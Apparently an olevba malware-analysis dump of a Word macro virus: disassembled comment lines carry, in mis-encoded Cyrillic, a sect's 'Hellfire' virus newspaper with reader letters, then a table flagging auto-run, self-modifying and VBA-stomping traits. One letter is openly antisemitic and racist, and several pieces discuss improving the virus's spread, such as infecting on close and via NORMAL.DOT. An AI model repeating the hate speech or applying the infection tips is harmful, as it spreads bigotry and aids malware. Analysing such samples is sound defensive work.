' 	QuoteRem 0x0000 0x03F2 "ß äóìàþ, ÷òî Âàøà ãàçåòà åñòü ïîëåçíåéøåå è íóæíîå èçîáðåòåíèå. Íå ñåêðåò, ÷òî ñåé÷àñ ñâîáîäà ïå÷àòè ñóùåñòâóåò òîëüêî íà áóìàãå, êîððóïöèÿ ñòàëà òîòàëüíîé, à ïðåññà ñïëîøü è ðÿäîì ëèæåò çàäíèöó âëàñòè, è íå âûïîëíÿåò ñâîåãî íàçíà÷åíèÿ. Ãàçåòà, êîòîðàÿ ïî-íàñòîÿùåìó ñâîáîäíà îò êàêîãî-ëèáî êîíòðîëÿ ñâåðõó, ñîâåðøåííî íåîáõîäèìà. Ó íåå åñòü òîëüêî îäèí íåäîñòàòîê: ñîâåðøåííî íåïîíÿòíî, êàê îñóùåñòâëÿåòñÿ îáðàòíàÿ ñâÿçü ìåæäó ÷èòàòåëÿìè è ãàçåòîé. Åñëè ÿ, ê ïðèìåðó, çàõî÷ó íàïèñàòü ïèñüìî â íåå, ïî êàêîìó àäðåñó åãî îòïðàâèòü? Äóìàþ, íàä ýòèì âîïðîñîì íàäî ïîðàáîòàòü. Êðîìå âñåãî ïðî÷åãî, ìíå î÷åíü ïîíðàâèëñÿ âàø ìàòåðèàë ïî íàöèîíàëüíîìó âîïðîñó. Ãîñïîäèí Ñàïóãèí ïîäíÿë âåñüìà àêòóàëüíóþ òåìó, îñîáåííî äëÿ íàøåãî ïðåäïðèÿòèÿ. Òàì, ãäå ÿ ðàáîòàþ, äàâíî òðåáóåòñÿ âìåøàòåëüñòâî ïàðòèè "ÐÍÅ". Ó íàñ ðóññêèõ ïî÷òè íå îñòàëîñü, íà êàæäîì ñêîëüêî-íèáóäü îòâåòñòâåííîì ïîñòó êàêîé-íèáóäü èíîðîäåö; âïðî÷åì, íå áóäó ãîëîñëîâíîé: â íàøåé ëàáîðàòîðèè ðàáîòàþò 8 ÷åëîâåê, èç íèõ ðóññêèõ òîëüêî òðîå, ñ÷èòàÿ ìåíÿ."
' Line #275:
' 	QuoteRem 0x0000 0x0228 "Îñòàëüíûå: åâðåéêà, óêðàèíêà, ñïóòàâøàÿñÿ ñ àðàáîì, òàòàðêà, îäíà, âîîáùå íåîïðåäåëåííîé ðàñîâîé ïðèíàäëåæíîñòè è êàâêàçåö, âûäàþùèé ñåáÿ çà ðóññêîãî. Èç ðóññêèõ ìíîãèå ïóòàþòñÿ ñî âñÿêèìè èíîðîäöàìè è ïëîäÿò îò íèõ íåïîëíîöåííûõ äåòåé-ïîëóêðîâîê, à ó÷åíûì ñåêðåòàðåì â íàøåì èíñòèòóòå ðàáîòàåò ñòàðûé êîë÷åíîãèé åâðåé, ïî êîòîðîìó äàâíî ïëà÷åò ãàçîâàÿ êàìåðà. Ïóñòü ãîñïîäèí Ñàïóãèí çíàåò, ÷òî â ìîåì ëèöå îí âñåãäà íàéäåò ÿðîãî ñòîðîííèêà ñâîåãî äåëà. Åñëè ýòî âîçìîæíî, ÿ õîòåëà áû çíàòü, êàê ìîæíî âñòóïèòü â ïàðòèþ "Ðóññêîå íàöèîíàëüíîå åäèíñòâî"."
' Line #276:
' 	QuoteRem 0x0000 0x0009 "Articl #3"
' Line #277:
' 	QuoteRem 0x0000 0x0021 "Ðåçíèê Ä. Ì., ïðåïîäàâàòåëü ÀÃÒÓ."
' Line #278:
' 	QuoteRem 0x0000 0x02A6 "ß õîòåë áû ñêàçàòü, ÷òî íå îäîáðÿþ Âàøó ãàçåòó, òàê êàê îíà ïî ñâîåé ñóòè ïðåñòóïíàÿ, è ìàòåðèàëû, ïóáëèêóåìûå â íåé, òî æå íîñÿò ïðåñòóïíûé õàðàêòåð. Ñ÷èòàþ íóæíûì íàïîìíèòü Âàì, ÷òî íèêòî íå îòìåíÿë ñòàòåé Óãîëîâíîãî êîäåêñà, ïðåäóñìàòðèâàþùèõ óãîëîâíóþ îòâåòñòâåííîñòü çà ñîçäàíèå è ðàñïðîñòðàíåíèå êîìïüþòåðíûõ âèðóñîâ. Îòíîñèòåëüíî îïóáëèêîâàííûõ ìàòåðèàëîâ ìîãó ñêàçàòü, ÷òî âàøè ëþäè ñèëüíî ðèñêóþò, ñîîáùàÿ ñâîè ôàìèëèè. ×òî êàñàåòñÿ âàøåãî Ñàïóãèíà, òî îí ïðîñòî ãíèäà è êîçåë, ðàâíî êàê è Áàðêàøîâ. Ñîâåðøåííî ñëó÷àéíî ÿ óçíàë, êòî òàêîé Ñàïóãèí, è êàêèå êîçëû èç íàøåé àäìèíèñòðàöèè åìó ïîìîãàþò. Äóìàþ, ÷òî åãî ïîëèòè÷åñêàÿ äåÿòåëüíîñòü íåñîâìåñòèìà ñ ó÷åáîé â ÀÃÒÓ."
' Line #279:
' 	QuoteRem 0x0000 0x0009 "Articl #4"
' Line #280:
' 	QuoteRem 0x0000 0x0022 "Âîåâîäèí È. Ã. ïðåïîäàâàòåëü ÀÃÒÓ."
' Line #281:
' 	QuoteRem 0x0000 0x032A "Ìíå êàæåòñÿ, ÷òî âàø âèðóñ íóæäàåòñÿ â çíà÷èòåëüíîì óñîâåðøåíñòâîâàíèè, òàê êàê ïðè ïåðâîì çàðàæåíèè îí íàìåðòâî âåøàåò Word è ñòðàäàåò ìíîæåñòâîì äðóãèõ íåäîðàáîòîê. ß äóìàþ, ÷òî çàðàæàòü äîêóìåíòû â ìîìåíò èõ îòêðûòèÿ è ñîçäàíèÿ ñîâåðøåííî íåîáÿçàòåëüíî: âî-ïåðâûõ, ýòî ïðèâîäèò ê çàâèñàíèþ, à âî-âòîðûõ ëþáîé ñîçäàííûé èëè îòêðûòûé äîêóìåíò îáÿçàòåëüíî áóäåò çàêðûò; çàðàæåíèå ïðè çàêðûòèè ïðåêðàñíî çàðåêîìåíäîâàëî ñåáÿ ó âñåõ ñîçäàòåëåé ìàêðîâèðóñîâ. Êðîìå òîãî, âíåäðåíèå òåêñòà ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò ïî-ìîåìó íå ñîâñåì áåçâðåäíî è íàñòðàèâàåò âàøèõ ïîòåíöèàëüíûõ ÷èòàòåëåé ïðîòèâ âàñ. Áûëî áû íàìíîãî óäîáíåå ñîçäàâàòü ñïåöèàëüíûé ôàéë è çàïèñûâàòü òåêñò ãàçåòû â íåãî. Ðàíî èëè ïîçäíî ÷èòàòåëü îáíàðóæèò íîâûå ôàéëû íà äèñêå è çàõî÷åò  ñ íèìè îçíàêîìèòüñÿ. Òîãäà ýòî íèêîìó íå ïðè÷èíèò âðåäà."
' Line #282:
' 	QuoteRem 0x0000 0x0009 "Articl #5"
' Line #283:
' 	QuoteRem 0x0000 0x0015 "Øóãàåâ Â. Ò. èíæåíåð."
' Line #284:
' 	QuoteRem 0x0000 0x01A5 "ß äóìàþ, ÷òî òàêàÿ ãàçåòà ñîâåðøåííî íåîáõîäèìà â íàøåì ãîðîäå, ãäå îò îáû÷íîé ïðåññû íåò íèêàêîãî òîëêà, òîëüêî îíà äîëæíà íàõîäèòüñÿ â ðóêàõ íå ñàòàíèñòîâ, à êàêîé-ëèáî íåéòðàëüíîé ãðóïïû ëþäåé. Ïîíèìàåòå, ðåáÿòà, âàøà ðåëèãèîçíàÿ ïðèíàäëåæíîñòü îòòàëêèâàåò ëþäåé îò âàñ. Ó íàñ ñëîâà "ñàòàíèçì" è "ñàòàíèñòû" âûçûâàþò èíñòèíêòèâíîå îòâðàùåíèå, à â ðåçóëüòàòå âàøè ïîòåíöèàëüíûå ÷èòàòåëè ïðîõîäÿò ìèìî âàæíîãî íà÷èíàíèÿ."
' Line #285:
' 	QuoteRem 0x0000 0x01E5 "Ñàì ÿ äàâíî óâëåêàþñü ïðîãðàììèðîâàíèåì, è ìíå êàæåòñÿ, ÷òî âû ñäåëàëè íàñòîÿùåå îòêðûòèå â îáëàñòè êîìïüþòåðíîé âèðóñîëîãèè: "âèðóñíîé ãàçåòû" (èëè "ãàçåòíîãî âèðóñà", êîìó êàê áîëüøå íðàâèòñÿ) åùå íèêòî, ïî ìîèì ñâåäåíèÿì, íå äåëàë. Ýòî î÷åíü õîðîøî, ÷òî âàøà ãàçåòà îòêðûòà äëÿ âñåõ, îäíàêî íåïîíÿòíî, êàêèì îáðàçîì ìîæíî íàïèñàòü ïèñüìî â ðåäàêöèþ íåå, âåäü íàñêîëüêî ÿ ïîíÿë, âû íå ïðèâåëè ñâîè êîîðäèíàòû? Ìåíÿ òàêæå èíòåðåñóåò, ìîæåòå ëè Âû ïîìåùàòü ðàçíûå îáúÿâëåíèÿ è ðåêëàìó?"
' Line #286:
' 	QuoteRem 0x0000 0x0009 "Articl #6"
' Line #287:
' 	QuoteRem 0x0000 0x001C "Ñèìîíîâ È. Â. âðà÷-ïñèõèàòð."
' Line #288:
' 	QuoteRem 0x0000 0x023E "Ñðàçó ñêàæó, ÷òî â âàøåì äåëå ÿ ðàçáèðàþñü ñëàáî, íî ìíå êàæåòñÿ, ÷òî ãëàâàðþ âàøåé ñåêòû è äèðåêòîðó ãàçåòû òðåáóåòñÿ ñåðüåçíîå ëå÷åíèå. Ïî-ìîåìó îíè ñòðàäàþò ìàíèåé âåëè÷èÿ, êîòîðàÿ óæå äîâåëà èõ äî ïðîòèâîïðàâíûõ äåéñòâèé, è â äàëüíåéøåì ìîæåò ïðèâåñòè â òþðüìó. Òî æå ñàìîå ìîãó ñêàçàòü îáî âñåì àâòîðñêîì êîëëåêòèâå. Î÷åíü íàñòîðàæèâàåò òî îáñòîÿòåëüñòâî, ÷òî ýòè ëþäè îòêðûòî ïðèâîäÿò ñâîè ôàìèëèè, êîãäà ñëåäîâàëî áû îæèäàòü îò íèõ ìàêñèìàëüíîé ñêðûòíîñòè. Êàê âðà÷ ÿ íàñòîÿòåëüíî ðåêîìåíäóþ èì ïðîéòè îáñëåäîâàíèå íà ïðåäìåò ñîñòîÿíèÿ èõ ïñèõèêè, ïîêà åùå íå ïîçäíî."
' Line #289:
' 	QuoteRem 0x0000 0x0009 "Articl #7"
' Line #290:
' 	QuoteRem 0x0000 0x0019 "Õàðèòîíîâ À. À., ñòóäåíò."
' Line #291:
' 	QuoteRem 0x0000 0x01D0 "Áåçóñëîâíî, íèêåì íå êîíòðîëèðóåìàÿ ãàçåòà íåîáõîäèìà, à òî, êàê âû åå ðàñïðîñòðàíÿåòå íå èìååò íèêàêîãî çíà÷åíèÿ. Òîëüêî âèðóñ íóæíî íåìíîãî äîðàáîòàòü, ÷òîáû îí íå èñêàæàë ðåäàêòèðóåìûé òåêñò. Õîòåëîñü áû çíàòü, êàê ó âàñ îñóùåñòâëÿåòñÿ ñâÿçü ñ îáùåñòâåííîñòüþ è ìîæåòå ëè âû îêàçàòü êîíêðåòíóþ ïîìîùü â êàêîì-ëèáî äåëå? Íåëüçÿ ëè ó âàñ ïîìåùàòü îáúÿâëåíèÿ î çíàêîìñòâàõ? Åñëè äà, òî ÿ îáåèìè ðóêàìè ãîëîñóþ çà ïðîäîëæåíèå âàøåãî äåëà è äàëüíåéøóþ ðàáîòó ãàçåòû."
' Line #292:
' 	QuoteRem 0x0000 0x001F "Êîððåñïîíäåíòû:  À. Ï. Ïåòóõîâ,"
' Line #293:
' 	QuoteRem 0x0000 0x0010 "Ê. Å. Âàñèëüêîâ,"
' Line #294:
' 	QuoteRem 0x0000 0x000E "Ì. Â. ×óðèëîâ,"
' Line #295:
' 	QuoteRem 0x0000 0x000F "Ñ. Ì. Ïåòðåíêî,"
' Line #296:
' 	QuoteRem 0x0000 0x000A "À.Ã.Ðûáêèí"
' Line #297:
' 	QuoteRem 0x0000 0x0009 "Articl #8"
' Line #298:
' 	QuoteRem 0x0000 0x001D "ÃÀÇÅÒÀ ÑÎÇÄÀÍÀ. ÊÓÄÀ ÒÅÏÅÐÜ ?"
' Line #299:
' 	QuoteRem 0x0000 0x00C5 "Íà ìàðòîâñêîì øàáàøå 2000 ãîäà áûëî ñîçâàíî îòäåëüíîå çàñåäàíèå ñ ó÷àñòèåì ðóêîâîäèòåëåé ñåêòû è ðóêîâîäÿùåãî ñîñòàâà ãàçåòû; åãî òåìîé ñòàëè ïåðñïåêòèâû äàëüíåéøåãî ðàçâèòèÿ ãàçåòû "Àäñêèé îãîíü"."
' Line #300:
' 	QuoteRem 0x0000 0x0192 "Â íà÷àëå çàñåäàíèÿ ãëàâàðü ñåêòû âûñòóïèë ñ ñîîáùåíèåì î íåîáõîäèìîñòè èñïðàâëåíèÿ íåäîñòàòêîâ â ðàáîòå ãàçåòû, êîòîðûå ñäåðæèâàëè åå äàëüíåéøåå ðàñïðîñòðàíåíèå. Â õîäå ïîñëåäîâàâøåé çà ýòèì äèñêóññèè áûëè âûñêàçàíû ìíîãî÷èñëåííûå ïðåäëîæåíèÿ, ïîäâåðãàâøèåñÿ îáñóæäåíèþ âñåìè ó÷àñòíèêàìè çàñåäàíèÿ. Îòäåëüíûå ïðåäëîæåíèÿ áûëè ïðèíÿòû ê èñïîëíåíèþ. Çà îãðàíè÷åííîñòüþ ìåñòà ìû ïðèâîäèì íåêîòîðûå èç íèõ."
' Line #301:
' 	QuoteRem 0x0000 0x001F "Ëåòîïèñåö ñåêòû  À. Â. Àáäèêååâ"
' Line #302:
' 	QuoteRem 0x0000 0x0009 "Articl #9"
' Line #303:
' 	QuoteRem 0x0000 0x001C "ÌÛ ÑÎÂÅÐØÅÍÑÒÂÓÅÌ ÑÂÎÉ ÂÈÐÓÑ"
' Line #304:
' 	QuoteRem 0x0000 0x010D "Íà íàñòîÿùèé ìîìåíò íàìè ïðîäåëàíà îãðîìíàÿ ðàáîòà ïî ðàñïðîñòðàíåíèþ ãàçåòû "Àäñêèé îãîíü" è íàêîïëåí íåìàëûé îïûò èñïîëüçîâàíèÿ êîìïüþòåðíûõ âèðóñîâ â êîíñòðóêòèâíûõ öåëÿõ. Âìåñòå ñ òåì, îòìå÷åíû îòäåëüíûå íåäîñòàòêè, êîòîðûå áóäóò ïðåîäîëåíû  õîäå äàëüíåéøåé ðàáîòû."
' Line #305:
' 	QuoteRem 0x0000 0x01AE "Â ÷àñòíîñòè, ïî îòçûâàì íàøèõ ñåêòàíòîâ, âçÿâøèõñÿ ðàñïðîñòðàíÿòü âèðóñ, ïðè çàðàæåíèè èì ãëàâíîãî øàáëîíà NORMAL.DOT â ïåðâûé ðàç Word "çàâèñàåò"; êðîìå òîãî, âèðóñ âñòàâëÿåò òåêñò ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò, ÷òî íå âñåãäà èäåò íà ïîëüçó åãî ðàçáîð÷èâîñòè íà ýêðàíå, à òàêæå ðàçäðàæàåò ïîëüçîâàòåëÿ. Ïî ñëîâàì íàøåãî êîíñóëüòàíòà-âèðóñîëîãà Ï. Â. Íîãèíà âèðóñ ïåðåãðóæåí ëèøíèìè äåòàëÿìè, êîòîðûå òîëüêî òîðìîçÿò åãî ðàáîòó."
' Line #306:
' 	QuoteRem 0x0000 0x011F "Ñ ó÷åòîì âûøåñêàçàííîãî áûëè ïðîâåäåíû ïåðåãîâîðû ñ àâòîðàìè âèðóñà, êîòîðûå íàïèñàëè åãî íîâóþ âåðñèþ, íå èìåþùóþ äàííûõ íåäîñòàòêîâ. Íàìè áûëè ïðîâåäåíû âñåñòîðîííèå èñïûòàíèÿ íîâîãî âèðóñà íà êîìïüþòåðàõ ñåêòû, êîòîðûå ïîêàçàëè åãî ñïîñîáíîñòü êîððåêòíî çàðàæàòü ëþáûå äîêóìåíòû Word."
' Line #307:
' 	QuoteRem 0x0000 0x00AE "Òåïåðü òåêñò ãàçåòû çàíîñèòñÿ â îòäåëüíûé ôàéë ôîðìàòà .RTF, êîòîðûé ïîëó÷àåò èìÿ "Àäñêèé îãîíü ¹ ..." è çàïèñûâàåòñÿ íà äèñê. Èíîãäà ýòî ïðîõîäèò íåçàìåòíî äëÿ ïîëüçîâàòåëÿ."
' Line #308:
' 	QuoteRem 0x0000 0x0027 "Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ"
' Line #309:
' 	QuoteRem 0x0000 0x000A "Articl #10"
' Line #310:
' 	QuoteRem 0x0000 0x001A "ÍÀÑÈËÜÍÎ  ÌÈË  ÍÅ  ÁÓÄÅØÜ."
' Line #311:
' 	QuoteRem 0x0000 0x034D "Íåñìîòðÿ íà òî, ÷òî ÿ ÿâëÿþñü àâòîðîì èäåè íàøåé ãàçåòû, ÿ õîòåëà áû íàïîìíèòü Âàì âñåì î íåîáõîäèìîñòè ñîáëþäåíèÿ ýëåìåíòàðíûõ ýòè÷åñêèõ íîðì, êîòîðûå ìû íàðóøèëè, ðàñïðîñòðàíÿÿ ãàçåòó, òàê ñêàçàòü, íàñèëüíî. Ïî-ìîåìó, ýòî íå äîëæíî ïîâûøàòü åå ðåéòèíã, à êàê ðàç íàîáîðîò. Ìíå êàæåòñÿ, ÷òî êàæäûé äîëæåí èìåòü âîçìîæíîñòü âûáèðàòü, ÷òî åìó ÷èòàòü. Íåëüçÿ ëè ñäåëàòü òàêóþ ïðîãðàììó, êîòîðàÿ ïîçâîëÿëà áû ÷èòàòåëþ ôèëüòðîâàòü èíôîðìàöèþ, äîñòàâëÿåìóþ âèðóñîì ïî òåìå. Íà âûõîä äîëæíî èäòè òîëüêî òî, ÷òî îí æåëàåò ÷èòàòü. Ìåíÿ òàêæå èíòåðåñóåò: íåëüçÿ ëè ïðåäîñòàâèòü ïîòåíöèàëüíûì ÷èòàòåëÿì âîçìîæíîñòü âûáèðàòü, ñòàíîâèòüñÿ ëè èì íåâîëüíûìè ðàñïðîñòðàíèòåëÿìè ãàçåòû èëè íåò? Íåëüçÿ ëè èì ïðè íåîáõîäèìîñòè ñòàâèòü íà ñâîèõ ìàøèíàõ êàêîé-íèáóäü óñëîâíûé çíàê äëÿ âèðóñà, êîòîðûé áóäåò áëîêèðîâàòü åãî ðàçìíîæåíèå? Ïðåäëàãàþ ïîäóìàòü íàä ýòèì."
' Line #312:
' 	QuoteRem 0x0000 0x01AE "È åùå: êàê ó÷èòåëü ëèòåðàòóðû ÿ íà ñîáñòâåííîì îïûòå çíàþ, ÷òî â ïîñëåäíåå âðåìÿ óðîâåíü ãðàìîòíîñòè ëþäåé çàìåòíî ñíèçèëñÿ; ýòî ÿâëåíèå çàòðîíóëî è íàøó ñåêòó. ×èòàÿ ìàòåðèàëû íåêîòîðûõ íàøèõ àâòîðîâ, ïðåäíàçíà÷åííûå äëÿ ïå÷àòè, ÿ íàøëà â íèõ ìíîæåñòâî ðàçíîîáðàçíûõ îøèáîê è îïå÷àòîê. Äëÿ èõ èñïðàâëåíèÿ âî âñåõ ãàçåòàõ èìåþòñÿ êîððåêòîðû, à â íàøåé - íåò. ß ñîâåòóþ ãîñïîäèíó äèðåêòîðó ïîäóìàòü î ââåäåíèè äîëæíîñòè êîððåêòîðà."
' Line #313:
' 	QuoteRem 0x0000 0x0031 "Ãëàâíûé ëèòåðàòóðîâåä-àíàëèòèê ñåêòû À. Í. Ãåíîâà"
' Line #314:
' 	QuoteRem 0x0000 0x000A "Articl #11"
' Line #315:
' 	QuoteRem 0x0000 0x001D "ÑÂÎÉ  ÂÈÐÓÑ - ÑÂÎÈÌÈ  ÐÓÊÀÌÈ."
' Line #316:
' 	QuoteRem 0x0000 0x036C "Ïðåæäå âñåãî, õîòåëîñü áû íàïîìíèòü âñåì, êòî çäåñü ïðèñóòñòâóåò, ÷òî âèðóñ, êîòîðûì ìû ðàñïðîñòðàíÿåì íàøó ãàçåòó, ÿâëÿåòñÿ âåñüìà îòâåòñòâåííûì èçäåëèåì: îí äîëæåí óäîâëåòâîðÿòü êó÷å ðàçíûõ òðåáîâàíèé, ïî íåìó ëþäè ñóäÿò î íàñ, î íàøåé êóëüòóðå è êîìïüþòåðíîé ãðàìîòíîñòè. Ìíå êàæåòñÿ âåñüìà ñòðàííûì, ÷òî âèðóñ ñîçäàþò ëþäè, èìåþùèå âåñüìà òóìàííîå ïðåäñòàâëåíèå î íàøåé ðàáîòå, à ðàñïðîñòðàíÿåìóþ èíôîðìàöèþ â íåãî âíîñèì ìû; ýòî ñòàëî îäíîé èç ïðè÷èí íåêîððåêòíîé ðàáîòû âèðóñà ïðè âûõîäå ïåðâîãî íîìåðà ãàçåòû, è íåèçâåñòíî, ñêîëüêî îøèáîê ýòî ìîæåò íàäåëàòü â äàëüíåéøåì. Ïîýòîìó, ÿ ñ÷èòàþ íåîáõîäèìûì ñîçäàâàòü ýòîò âèðóñ ñâîèìè ðóêàìè. Èç ñòàðîãî âèðóñà íåîáõîäèìî âçÿòü ñàìîå ëó÷øåå è âûðåçàòü ñàìîå õóäøåå, ðàçóìååòñÿ, ñ ñîáëþäåíèåì âñåõ ïðàâ åãî àâòîðîâ. Òî, ÷òî ïðåäëîæèëà ðàíåå Àííà Íèêîëàåâíà áåçóñëîâíî çàñëóæèâàåò âíèìàíèÿ, è íàä ýòèì òîæå ñëåäóåò ïîðàáîòàòü."
' Line #317:
' 	QuoteRem 0x0000 0x0193 "Äëÿ âûïîëíåíèÿ ïîäîáíîé ðàáîòû íåîáõîäèì ïðîãðàììèñò ñ îïûòîì ñîçäàíèÿ è ðàñïðîñòðàíåíèÿ ìàêðîâèðóñîâ. Ïîðó÷àòü òàêóþ ðàáîòó ãëàâíîìó ïðîãðàììèñòó ñåêòû íåöåëåñîîáðàçíî ïî ïðè÷èíå åãî áîëüøîé çàãðóæåííîñòè, è ïîýòîìó ÿ ñ÷èòàþ íåîáõîäèìûì óêîìïëåêòîâàòü øòàò ãàçåòû òàêèì ñïåöèàëèñòîì. Â åãî îáÿçàííîñòè äîëæíî âõîäèòü ñîçäàíèå è óñîâåðøåíñòâîâàíèå âñåãî ïðîãðàììíîãî îáåñïå÷åíèÿ ãàçåòû, âêëþ÷àÿ è âèðóñ."
' Line #318:
' 	QuoteRem 0x0000 0x001E "Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ"
' Line #319:
' 	QuoteRem 0x0000 0x000A "Articl #12"
' Line #320:
' 	QuoteRem 0x0000 0x0013 "ÌÛ - ÂÀÌ, ÂÛ - ÍÀÌ."
' Line #321:
' 	QuoteRem 0x0000 0x03F9 "Êàê óæå óïîìèíàëîñü â ïåðâîì íîìåðå "Àäñêîãî îãíÿ", äëÿ íàøåé ãàçåòû îñòðî ñòîèò ïðîáëåìà îáðàòíîé ñâÿçè ñ ÷èòàòåëÿìè. Â íàñòîÿùèé ìîìåíò ìû èñïîëüçóåì ñåòü êîððåñïîíäåíòîâ, ðàñïðåäåëåííûõ ïî ãîðîäó, îäíàêî ýòîò ñïîñîá ìàëîýôôåêòèâåí, êîãäà ÷èòàòåëü èìååò íàìåðåíèå ïåðåäàòü êàêîå-ëèáî ñîîáùåíèå â ãàçåòó è âûíóæäåí èñêàòü âñòðå÷è ñ êîððåñïîíäåíòîì. Â òî æå âðåìÿ, äåëàòü êîððåñïîíäåíòîâ ëåãêî äîñòóïíûìè ìû íå ìîæåì, òàê êàê ýòî ñäåëàåò èõ óÿçâèìûìè ñî ñòîðîíû ïðàâîîõðàíèòåëüíûõ îðãàíîâ è êîíêóðèðóþùèõ ñåêò. Äëÿ ðåøåíèÿ äàííîé ïðîáëåìû áûëî âíåñåíî íåñêîëüêî ïðåäëîæåíèé, îäíàêî âñå îíè áóäóò ðåàëèçîâàíû ïîçæå, è äî òîãî ìîìåíòà ìû ïðåäëàãàåì ñâîèì ÷èòàòåëÿì ïðîñòî ïèñàòü â ðåäàêöèþ ïî àäðåñó, êîòîðûé ïðèâîäèì íèæå â çàøèôðîâàííîì âèäå. Ýòîò øèôð áûë êîãäà-òî ðàçðàáîòàí â íàøåé ñåêòå è ïðåêðàñíî çàðåêîìåíäîâàë ñåáÿ. Ê íàñòîÿùåìó âðåìåíè îí çàìåíåí áîëåå ñîâåðøåííûì, è ïîýòîìó åãî èñïîëüçîâàíèå â òàêèõ öåëÿõ íå ïðè÷èíèò íèêàêîãî óùåðáà. Ïî ìíåíèþ íàøèõ ýêñïåðòîâ òàêîé øèôð ìîãóò ðàñøèôðîâàòü òîëüêî òå ëþäè,"
' Line #322:
' 	QuoteRem 0x0000 0x01FE "êîòîðûå äåéñòâèòåëüíî æåëàþò ñâÿçàòüñÿ ñ ðåäàêöèåé. Ïèñüìà ìû ïðèíèìàåì áåç îãðàíè÷åíèé; ÷òî êàñàåòñÿ ëþäåé, êîòîðûå áóäóò ÿâëÿòüñÿ ëè÷íî, òî îíè áóäóò ïîäâåðãàòüñÿ ïðîâåðêå íà ïðèíàäëåæíîñòü ê ïðàâîîõðàíèòåëüíûì îðãàíàì, äëÿ ÷åãî ó íàñ åñòü ñïåöèàëüíàÿ ìåòîäèêà. Òåì, êîãî ìû ñî÷òåì ñîòðóäíèêàìè âûøåóïîìÿíóòûõ ó÷ðåæäåíèé, áóäóò ãîâîðèòü, ÷òî íè÷åãî ïîäîáíîãî çäåñü íåò. Ïåðâûå 10 ÷èòàòåëåé, ïðàâèëüíî ðàñøèôðîâàâøèå àäðåñ, ïîëó÷àò ïðèç â âèäå ïðàâà íà âíåî÷åðåäíóþ ïóáëèêàöèþ ñâîèõ ìàòåðèàëîâ â íàøåé ãàçåòå."
' Line #323:
' 	QuoteRem 0x0000 0x00A4 "Îñîáî ïîä÷åðêèâàþ: íåò íèêàêîé íåîáõîäèìîñòè íàçûâàòüñÿ íàñòîÿùèì èìåíåì, â íàøåé ãàçåòå Âû ìîæåòå ïóáëèêîâàòüñÿ ïîä ïñåâäîíèìîì èëè àíîíèìíî. Èòàê: àäðåñ ðåäàêöèè:"
' Line #324:
' 	QuoteRem 0x0000 0x0080 " Ìàû1  øå6ãóð îëàèçâ öì åÖçå Íä×ÒùàÈààë.åí àìèÏèðáñ èÿÿíàáå ûìâíâ ìï. îè¸ ìñ Ñí â8ñïó åðäþàìî ø ð 1åèâ7äîâà ïàêòù÷ðüèàîñî èñï.ðà"
' Line #325:
' 	QuoteRem 0x0000 0x0011 "Æåëàþ Âàì óñïåõà!"
' Line #326:
' 	QuoteRem 0x0000 0x001F "Ãëàâíûé ðåäàêòîð Â. Ä. Òàðàñêèí"
' Line #327:
' 	QuoteRem 0x0000 0x000A "Articl #13"
' Line #328:
' 	QuoteRem 0x0000 0x000C "ÍÀØÈ   ÏËÀÍÛ"
' Line #329:
' 	QuoteRem 0x0000 0x0260 "Êàê ïîêàçàë àíàëèç èíòåðâüþ, âçÿòûõ ó íåêîòîðûõ íàøèõ ÷èòàòåëåé, îíè â áîëüøèíñòâå ñâîåì èíòåðåñóþòñÿ âîçìîæíîñòüþ ïîìåùàòü â íàøåé ãàçåòå ñâîè îáúÿâëåíèÿ, à íåêîòîðûå åùå è ðåêëàìó. Äëÿ ýòîãî ìû ïëàíèðóåì ââåñòè â ñâîé ñîñòàâ ñëóæáó îáúÿâëåíèé è îòäåë ðåêëàìû. Òå, êòî ñìîæåò ðàñøèôðîâàòü íàø àäðåñ, ïîëó÷èò âîçìîæíîñòü ïðèñûëàòü îáúÿâëåíèÿ. Äëÿ òåõ, êòî íå ñìîæåò ýòîãî ñäåëàòü, ìû ðàçðàáàòûâàåì ñèñòåìó îáðàòíîé ñâÿçè, îñíîâàííóþ íà ïåðåäà÷å èíôîðìàöèè ïðè ïîìîùè ìàêðîâèðóñà, ïîäîáíî òîìó, êàê ìû ïåðåïðàâëÿåì Âàì ãàçåòó. Ýòà ñèñòåìà áóäåò "äîâåäåíà äî óìà" êàê òîëüêî ó íàñ ïîÿâèòñÿ øòàòíûé ïðîãðàììèñò."
' Line #330:
' 	QuoteRem 0x0000 0x010A "Íè äëÿ êîãî íå ñåêðåò, ÷òî ïðèáëèæàåòñÿ 10-ëåòíèé þáèëåé ñåêòû. Ê ýòîé äàòå ìû ïëàíèðóåì ðÿä ïóáëèêàöèé, ïîñâÿùåííûõ èñòîðèè ñåêòû, åå ñîçäàíèþ è íûíåøíåé äåÿòåëüíîñòè. ß ïðèãëàøàþ âñåõ ÷ëåíîâ ñåêòû ïîìåùàòü ñâîè ïóáëèêàöèè íà ëþáóþ òåìó, ñâÿçàííóþ ñ èñòîðèåé ñåêòû."
' Line #331:
' 	QuoteRem 0x0000 0x001E "Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

